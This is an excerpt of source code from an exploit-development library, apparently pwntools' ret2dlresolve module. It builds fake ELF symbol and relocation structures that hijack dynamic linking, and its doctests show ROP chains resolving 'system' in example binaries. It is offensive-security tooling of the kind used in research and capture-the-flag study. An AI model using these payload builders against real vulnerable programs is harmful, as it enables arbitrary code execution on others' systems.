...
We can automate the  process of exploitation with these some example binaries.
    ...
    >>> context.binary = elf = ELF(pwntools.data.elf.ret2dlresolve.get('i386'))
...
You can also use ``Ret2dlresolve`` on AMD64:
    ...
    >>> context.binary = elf = ELF(pwntools.data.elf.ret2dlresolve.get('amd64'))
    >>> rop = ROP(elf)
    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
    >>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
    >>> rop.ret2dlresolve(dlresolve)
...
from pwntools.util.misc import align
...
class Elf32_Sym(object):
    ...
    def __init__(self, st_name=0, st_value=0, st_size=0,
                 st_info=0, st_other=0, st_shndx=0):
...
class Ret2dlresolvePayload(object):
    ...
    def _get_recommended_address(self):
        bss = self.elf.get_section_by_name(
            ".bss").header.sh_addr + self.elf_load_address_fixup
    ...
    def _build_structures(self):
        ...
        # ElfSym
        # index for both symtab and versym
        index = align(ElfSym.size, symbol_end_addr -
                      self.symtab) // ElfSym.size
        ...
        self.reloc_index = align(ElfRel.size,
                                 sym_end_addr - self.jmprel) // ElfRel.size

        # ElfRel
        rel_addr = self.jmprel + self.reloc_index * ElfRel.size
        rel_type = 7
        rel = ElfRel(
            r_offset=self.data_addr,
            r_info=(
                index << ELF_R_SYM_SHIFT) +
            rel_type)

        # When a program's PIE is enabled, r_offset should be the relative
        # address, not the absolute address
        if self.elf.pie:
            rel = ElfRel(
                r_offset=self.data_addr -
                (
                    self.elf.load_addr +
                    self.elf_load_address_fixup),
                r_info=(
                    index << ELF_R_SYM_SHIFT) +
                rel_type)
    ...
    def _build_args(self):
        # The second part of the payload will include strings and pointers
        # needed for ROP.
        queue = Queue()
        ...
        for i, arg in enumerate(self.real_args):
            if isinstance(arg, (list, tuple)):
                self.real_args[i] = self.data_addr + \
                    len(self.payload) + queue.size()
                queue.extend(arg)
